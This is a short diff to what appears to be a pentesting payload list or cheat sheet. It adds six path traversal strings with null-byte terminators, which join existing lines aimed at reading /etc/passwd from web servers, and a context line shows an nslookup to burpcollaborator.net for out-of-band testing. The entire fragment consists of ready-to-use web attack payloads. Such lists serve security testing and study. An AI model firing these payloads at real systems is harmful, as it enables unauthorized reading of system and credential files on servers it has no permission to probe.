@@ -48,3 +48,10 @@ nslookup+burpcollaborator.net
 /var/www/images/../../../etc/passwd
 /var/www/images/..//..//..//..//etc/passwd
 /var/www/images/....//....//....//....//etc/passwd
+../../../etc/passwd%00
+..//..//..//..//etc/passwd%00
+....//....//....//....//etc/passwd%00
+/var/www/images/../../../etc/passwd%00
+/var/www/images/..//..//..//..//etc/passwd%00
+/var/www/images/....//....//....//....//etc/passwd%00
+```
